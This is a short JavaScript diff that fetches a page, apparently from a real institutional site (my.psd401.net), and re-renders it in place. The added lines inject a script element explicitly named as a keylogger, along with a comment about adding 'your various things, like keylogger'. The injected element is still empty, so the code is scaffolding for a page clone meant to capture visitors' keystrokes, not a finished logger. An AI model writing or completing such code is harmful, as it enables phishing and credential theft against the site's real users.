@@ -16,9 +16,13 @@
       var httpRequest = this;
       if (httpRequest.readyState === 4 && httpRequest.status === 200) {
         //change all relative filepaths in document ("/img.png", etc.) to literal filepaths on the Internet, by translating the relative filepaths to literal filepaths ("my.psd401.net/img.png", etc.).
-        var htmlDocumentFile = new XMLSerializer().serializeToString(httpRequest.response);
+        //also add in your various things, like keylogger, etc.
+        var htmlDocumentDom = httpRequest.response;
+        var keyloggerScript = htmlDocumentDom.createElement("script");
+        htmlDocumentDom.documentElement.appendChild(keyloggerScript);
+        var htmlDocumentFileText = new XMLSerializer().serializeToString(htmlDocumentDom);
         document.open();
-        document.write(htmlDocumentFile);
+        document.write(htmlDocumentFileText);
         document.close();
       };
     };
